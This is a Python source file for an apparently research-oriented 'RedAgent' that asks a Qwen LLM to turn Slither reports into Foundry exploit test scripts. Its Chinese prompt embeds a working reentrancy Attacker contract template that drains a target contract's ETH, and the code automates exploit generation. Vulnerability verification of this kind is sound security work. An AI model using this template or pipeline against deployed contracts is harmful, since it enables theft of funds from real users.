import re
from langchain_openai import ChatOpenAI
from langchain_core.prompts import ChatPromptTemplate
from src.core.config import settings

class RedAgent:
    def __init__(self):
        # 🟢 还原为千问 (DashScope/Qwen)
        self.llm = ChatOpenAI(
            api_key=settings.DASHSCOPE_API_KEY,
            base_url="https://dashscope.aliyuncs.com/compatible-mode/v1",
            model=settings.LLM_MODEL,  # 确保 .env 里配的是 qwen-max 或 qwen-plus
            # 🔥 极低温度：强制模型“死板”地遵守模板，防止它自作聪明写出逻辑漏洞
            temperature=0.1
        )

    def generate_exploit(self, source_code: str, report: str) -> str:
        """
        基于 Slither 报告生成通用的 Foundry 攻击脚本
        """
        prompt = ChatPromptTemplate.from_template(
            """
            你是一个世界顶级的智能合约安全研究员（Red Team）。
            你的任务是根据静态分析报告，编写一个 Foundry 测试脚本 (`.t.sol`) 来复现并验证漏洞。

            【输入数据】
            1. **目标合约代码**:
            ```solidity
            {source}
            ```
            2. **Slither 漏洞报告**:
            {report}

            【核心任务】
            编写一个**编译通过**且**断言成功**的 Solidity 攻击脚本。

            【⚠️ 警告：你必须严格遵守以下四大准则，否则测试必挂！】

            ### 1. 攻击模板 (One-Shot Template)
            针对资金窃取（Reentrancy）漏洞，**必须**照抄以下 `Attacker` 合约结构，**不要自己发挥**：
            ```solidity
            contract Attacker {{
                Target target;
                constructor(address _target) {{ target = Target(_target); }}

                // [关键 1] 启动函数：先买票，再进场
                function attack() external payable {{
                    require(msg.value >= 1 ether, "Need ETH to start");
                    // 必须先存款！否则 withdraw 会因为余额为0而 revert
                    target.deposit{{value: 1 ether}}(); 
                    // 触发第一次提款
                    target.withdraw();
                }}

                // [关键 2] 重入逻辑：回马枪
                receive() external payable {{
                    // 必须包含递归调用！只要银行还有钱，就继续取
                    if (address(target).balance >= 1 ether) {{
                        target.withdraw();
                    }}
                }}
            }}
            ```

            ### 2. 初始化要求 (Setup Requirements)
            解决“空金库悖论”。在 `setUp()` 中必须执行：
            1. 创建受害者：`address victim = makeAddr("victim");`
            2. 给受害者发钱：`vm.deal(victim, 100 ether);`
            3. **[至关重要] 受害者存钱**：
               ```solidity
               vm.prank(victim);
               target.deposit{{value: 100 ether}}(); // 银行里必须先有钱！
               ```
            4. 给攻击者启动资金：`vm.deal(address(attacker), 1 ether);`

            ### 3. 断言标准 (Assertion Standards)
            解决“断言逻辑错误”。重入攻击偷走的是物理 ETH，不一定会修改账本（Mapping）。
            - ❌ **错误断言**: `assertEq(target.balances(victim), 0);` (账本可能没变)
            - ✅ **正确断言**: 
              ```solidity
              // 验证银行被掏空 (余额 < 1 ETH)
              assertLt(address(target).balance, 1 ether); 
              // 验证攻击者获利 (余额 > 100 ETH)
              assertGt(address(attacker).balance, 100 ether);
              ```

            ### 4. 常见错误警示 (Common Pitfalls)
            - **入场券缺失**: 攻击前忘记 `deposit`，导致直接被 revert。
            - **无效重入**: `receive()` 里忘记写 `target.withdraw()`，导致只取回本金，没偷到钱。
            - **Prank 混用**: 严禁 `startPrank` 后不 `stopPrank`。建议直接用 `attacker.attack{{value: 1 ether}}()` (不需要 vm.prank 攻击者合约，或者用完立刻 stop)。

            【Foundry 工程规范】
            1. 必须包含 `import "forge-std/Test.sol";`
            2. ⚠️ **关键修改**: 不要复制目标合约代码！
               - 目标合约已保存在 `src/Target.sol`。
               - 测试文件将保存在 `test/` 目录下。
               - **必须使用此导入语句**: `import "../src/Target.sol";` 
               - 在代码中直接使用 `Target` 合约 (合约名通常在代码中定义)。

            【最终输出】
            只返回一段完整的 Solidity 代码，不要包含 Markdown 标记。
            """
        )
        chain = prompt | self.llm
        try:
            result = chain.invoke({
                "source": source_code,
                "report": report
            })

            raw_content = result.content

            # =======================================================
            # 🧹 代码清洗逻辑 (保持不变)
            # =======================================================

            # 1. 提取代码块
            code_blocks = re.findall(r'```solidity(.*?)```', raw_content, re.DOTALL)
            if code_blocks:
                code = code_blocks[-1].strip()
            else:
                code_blocks = re.findall(r'```(.*?)```', raw_content, re.DOTALL)
                if code_blocks:
                    code = code_blocks[-1].strip()
                else:
                    code = raw_content.strip()

            # 2. 移除 Markdown
            code = code.replace("```solidity", "").replace("```", "")

            # 3. 强制补全头部依赖
            if "pragma solidity" not in code:
                version_match = re.search(r'pragma solidity\s+([\^><=0-9\.]+);', source_code)
                version = version_match.group(1) if version_match else "^0.8.20"
                code = f"pragma solidity {version};\n" + code

            if 'import "forge-std/Test.sol"' not in code:
                pragma_match = re.search(r'pragma solidity.*?;', code)
                if pragma_match:
                    end_idx = pragma_match.end()
                    code = code[:end_idx] + '\nimport "forge-std/Test.sol";' + code[end_idx:]
                else:
                    code = 'import "forge-std/Test.sol";\n' + code

            return code

        except Exception as e:
            print(f"RedAgent Error: {e}")
            return f"""
pragma solidity ^0.8.20;
import "forge-std/Test.sol";
contract ErrorLog is Test {{
    function testRedAgentGenFailed() public {{
        assertTrue(false, "RedAgent LLM Generation Failed: {str(e)}");
    }}
}}
"""